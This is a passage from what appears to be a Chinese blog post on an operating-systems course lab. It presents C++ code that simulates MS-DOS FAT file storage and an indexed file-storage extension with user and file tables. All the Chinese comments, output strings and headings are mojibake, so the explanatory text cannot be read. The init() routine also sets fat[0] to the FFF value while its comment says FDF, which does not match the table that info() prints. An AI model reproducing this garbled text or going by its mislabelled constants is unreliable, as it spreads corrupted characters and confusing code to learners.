class="hljs-comment">//ä¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-comment">//æ‰¾åˆ°è¦æ’å…¥ä½ç½®çš„å‰ä¸€ä¸ªå—å·</span><br>        <span class="hljs-keyword">int</span> temp = fd.start[pos];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; num - <span class="hljs-number">1</span>; i++)<br>            temp = fat[temp];<br>        <span class="hljs-comment">//å°†æ–°çš„ä½ç½®çš„ä¸‹ä¸€ä¸ªç´¢å¼•æŒ‡å‘åŸæ¥çš„ä¸‹ä¸€ä¸ªå—</span><br>        fat[p] = fat[temp];<br>        <span class="hljs-comment">//å°†ä¸Šä¸€ä¸ªå—çš„ä¸‹ä¸€ä¸ªç´¢å¼•æŒ‡å‘æ–°çš„ä½ç½®ï¼Œå®Œæˆæ’å…¥</span><br>        fat[temp] = p;<br>    &#125;<br>    <span class="hljs-comment">//æ›´æ–°å‰©ä½™çš„å†…å­˜å—</span><br>    leftblocks--;<br>    fd.filelength[pos]++;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********æ’å…¥æ–‡ä»¶å—æˆåŠŸï¼********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//è¾“å‡ºæ–‡ä»¶ç›®å½•å’Œ fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------æ–‡ä»¶ç›®å½•------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  æ–‡ä»¶å   èµ·å§‹ä½ç½®  é€»è¾‘é•¿åº¦  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---æ–‡ä»¶å®šä½è¡¨(fat)--|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    ç´¢å¼•    å†…å®¹    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      0      FDF    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      1      FFF    |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %4d    %4d     |\n&quot;</span>, i, fat[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//åŠŸèƒ½é€‰æ‹©æ¸…å•</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">choicelist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|-----------------------MS-DOSç£ç›˜æ–‡ä»¶å­˜å‚¨ç®¡ç†èœå•-------------------|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      1.å‘fatä¸­å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶:                        |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      2.å‘fatä¸­çš„æ–‡ä»¶æ’å…¥æ•°æ®:                      |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      3.è¾“å‡ºå½“å‰æ–‡ä»¶ç›®å½•ä»¥åŠfatä¿¡æ¯:                |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      4.ç»“æŸæ“ä½œï¼Œé€€å‡ºç³»ç»Ÿ:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">int</span> order;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-comment">//é€šè¿‡å­—ç¬¦ä¸²è¾“å…¥æ¥é€‰æ‹©æƒ³è¦æµ‹è¯•çš„åŠŸèƒ½</span><br>        <span class="hljs-built_in">choicelist</span>();<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥ä½ è¦æ‰§è¡Œçš„æ“ä½œçš„ç¼–å·: &quot;</span>;<br>        cin &gt;&gt; order;<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (order)<br>        &#123;<br>        <span class="hljs-comment">//å­˜ ä¸€ä¸ªæ–‡ä»¶</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">save</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//åœ¨æŒ‡å®šçš„æ–‡ä»¶ä¸­çš„ç‰¹å®šä½ç½®æ’å…¥ä¸€ä¸ªå—</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">insert</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//æ˜¾ç¤ºå½“å‰çš„ç³»ç»Ÿä¿¡æ¯</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">info</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//æµ‹è¯•ç»“æŸé€€å‡ºç³»ç»Ÿ3</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;ç³»ç»Ÿç»“æŸ&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//è¾“å…¥æŒ‡ä»¤ä¸åˆæ³•</span><br>        <span class="hljs-keyword">default</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;æŒ‡ä»¤è¾“å…¥é”™è¯¯&quot;</span> &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>åˆæ€</p><p><img src="/posts/6255939a/image-20211217140649270.png" alt="image-20211217140649270"></p><p>ä¿å­˜æ–°æ–‡ä»¶</p><p><img src="/posts/6255939a/image-20211217140757616.png" alt="image-20211217140757616"></p><p>å¯¹æ–°ä¿å­˜çš„æ–‡ä»¶è¿›è¡Œæ’å…¥</p><p><img src="/posts/6255939a/image-20211217140850377.png" alt="image-20211217140850377"></p><h3 id="ç¬¬äºŒé¢˜ç´¢å¼•æ–‡ä»¶å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#ç¬¬äºŒé¢˜ç´¢å¼•æ–‡ä»¶å­˜å‚¨ç»“æ„"></a> ç¬¬äºŒé¢˜ï¼šç´¢å¼•æ–‡ä»¶å­˜å‚¨ç»“æ„</h3><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"></a> <strong>æ•°æ®ç»“æ„</strong>å’Œç¬¦å·è¯´æ˜</h4><p>ç›¸æ¯”äºä¸Šä¸€é¢˜ï¼Œå¢åŠ äº†ä¸‰ä¸ªæ•°æ®ç»“æ„ï¼Œåˆ†åˆ«æ˜¯ç´¢å¼•è¡¨ã€æ–‡ä»¶ç›®å½•è¡¨ã€ç”¨æˆ·è¡¨</p><p>åŒæ—¶å› ä¸ºå…¶ç»“æ„æ˜¯åç§°å’Œåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œæ•…é‡‡ç”¨äº†stlæ•°æ®ç»“æ„ä¸­çš„mapæ¥åæ˜ æ˜ å°„å…³ç³»ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Indextab</span> //ç´¢å¼•è¡¨</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> tab[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Filetab</span>//æ–‡ä»¶ç›®å½•è¡¨</span><br><span class="hljs-class">&#123;</span><br>    map&lt;string, Indextab&gt; filetab;<br>&#125;;<br>map&lt;string, Filetab&gt; usertab;<span class="hljs-comment">//ç”¨æˆ·è¡¨</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜-2"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜-2"></a> å‡½æ•°è¯´æ˜</h4><p>ç›¸æ¯”äºä¸Šä¸€é¢˜ï¼Œæ”¹åŠ¨ä¹‹å¤„åœ¨äºå¢åŠ äº†ä¸€ä¸ªæ˜¯æ–‡ä»¶ç»“æ„æ”¹å˜æˆç´¢å¼•ç»“æ„çš„å‡½æ•°ã€‚</p><p>å‡½æ•°æ€è·¯ä¸ºé¦–å…ˆè¾“å…¥ç”¨æˆ·åï¼Œç„¶åä¾æ¬¡è¦æ±‚ç”¨æˆ·è¾“å…¥å±äºè‡ªå·±çš„æ–‡ä»¶ï¼Œå°†å…¶åŠ å…¥è¯¥ç”¨æˆ·çš„æ–‡ä»¶è¡¨ä¸­ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change_to_index</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">//æ‰“å°å½“å‰æ–‡ä»¶ç›®å½•</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å½“å‰æ–‡ä»¶ç›®å½•ï¼š\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------æ–‡ä»¶ç›®å½•------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  æ–‡ä»¶å   èµ·å§‹ä½ç½®  é€»è¾‘é•¿åº¦  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ç”¨æˆ·åï¼ŒæŒ‰qé€€å‡º\n&quot;</span>);<br>        string name;<br>        cin &gt;&gt; name;<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;q&quot;</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å½“å‰ç”¨æˆ·çš„æ–‡ä»¶åï¼ŒæŒ‰qé€€å‡º\n&quot;</span>);<br>                string file;<br>                cin &gt;&gt; file;<br>                <span class="hljs-keyword">if</span> (file == <span class="hljs-string">&quot;q&quot;</span>)<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">int</span> t = <span class="hljs-built_in">FindFile</span>(file);<br>                    <span class="hljs-keyword">if</span> (!t)<br>                    &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯·é‡æ–°è¾“å…¥æ–‡ä»¶åï¼š&quot;</span>);<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        usertab[name].filetab[file].length = <span class="hljs-number">0</span>;<span class="hljs-comment">//åˆå§‹åŒ–ç”¨æˆ·æ–‡ä»¶è¡¨è®°å½•æ•°</span><br>                        <span class="hljs-keyword">int</span> cpos = fd.start[t];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fd.filelength[t]; i++)<br>                        &#123;<br>                            usertab[name].filetab[file].tab[i] = cpos;<span class="hljs-comment">//è®°å½•ç‰©ç†å—å·</span><br>                            cpos = fat[cpos];<span class="hljs-comment">//åˆ°ä¸‹ä¸€ä¸ªç‰©ç†å—</span><br>                            usertab[name].filetab[file].length++;<span class="hljs-comment">//è®°å½•æ•°åŠ ä¸€</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç -2"><a class="markdownIt-Anchor" href="#æºä»£ç -2"></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// MS-DOS ç£ç›˜æ–‡ä»¶å­˜å‚¨ç»“æ„</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FDF -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FFF -2</span><br><span class="hljs-comment">//æ–‡ä»¶å®šä½è¡¨ fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//ä¸»å­˜å‰©ä½™å—çš„æ•°é‡</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//æ–‡ä»¶ç›®å½•</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶èµ·å§‹å—å·</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶æ•°é‡</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Indextab</span> //ç´¢å¼•è¡¨</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> tab[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Filetab</span>//æ–‡ä»¶ç›®å½•è¡¨</span><br><span class="hljs-class">&#123;</span><br>    map&lt;string, Indextab&gt; filetab;<br>&#125;;<br>map&lt;string, Filetab&gt; usertab;<span class="hljs-comment">//ç”¨æˆ·è¡¨</span><br><br><span class="hljs-comment">//åˆå§‹åŒ–å‡½æ•°ï¼Œé‡ç½® fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        fat[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//å°†ç¬¬ä¸€ä½è®¾ç½®ä¸º FDF</span><br>    fat[<span class="hljs-number">0</span>] = <span class="hljs-number">-2</span>;<br>    <span class="hljs-comment">//å°†ç¬¬äºŒä½è®¾ç½®æˆæ‰€æœ‰æ–‡ä»¶çš„ç»“æŸ FFF</span><br>    fat[<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>    leftblocks -= <span class="hljs-number">2</span>;<br>    fd.filenum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name &lt;&lt; endl;</span><br>    fd.name[++fd.filenum] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name[fd.filenum] &lt;&lt; endl;</span><br>    fd.start[fd.filenum] = <span class="hljs-number">2</span>;<br>    fat[<span class="hljs-number">2</span>] = <span class="hljs-number">5</span>; <span class="hljs-comment">//åˆå§‹åŒ–ç¬¬ä¸€ä¸ªæ–‡ä»¶</span><br>    fat[<span class="hljs-number">5</span>] = <span class="hljs-number">8</span>;<br>    fat[<span class="hljs-number">8</span>] = <span class="hljs-number">11</span>;<br>    fat[<span class="hljs-number">11</span>] = <span class="hljs-number">18</span>;<br>    fat[<span class="hljs-number">18</span>] = <span class="hljs-number">24</span>;<br>    fat[<span class="hljs-number">24</span>] = FFF;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">6</span>;<br><br>    fd.name[++fd.filenum] = <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-comment">//åˆå§‹åŒ–ç¬¬äºŒä¸ªæ–‡ä»¶</span><br>    fd.start[fd.filenum] = <span class="hljs-number">6</span>;<br>    fat[<span class="hljs-number">6</span>] = <span class="hljs-number">9</span>;<br>    fat[<span class="hljs-number">9</span>] = <span class="hljs-number">14</span>;<br>    fat[<span class="hljs-number">14</span>] = <span class="hljs-number">19</span>;<br>    fat[<span class="hljs-number">19</span>] = <span class="hljs-number">22</span>;<br>    fat[<span class="hljs-number">22</span>] = <span class="hljs-number">28</span>;<br>    fat[<span class="hljs-number">28</span>] = <span class="hljs-number">30</span>;<br>    fat[<span class="hljs-number">30</span>] = FFF;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">7</span>;<br>&#125;<br><br><span class="hljs-comment">//å¯»æ‰¾ç›¸åŒæ–‡ä»¶åçš„æ¡ç›®</span><br><span class="hljs-comment">//æ‰¾åˆ°å°±è¿”å›åœ¨æ–‡ä»¶ç›®å½•ä¸­çš„ç´¢å¼•</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">FindFile</span><span class="hljs-params">(string filename)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; 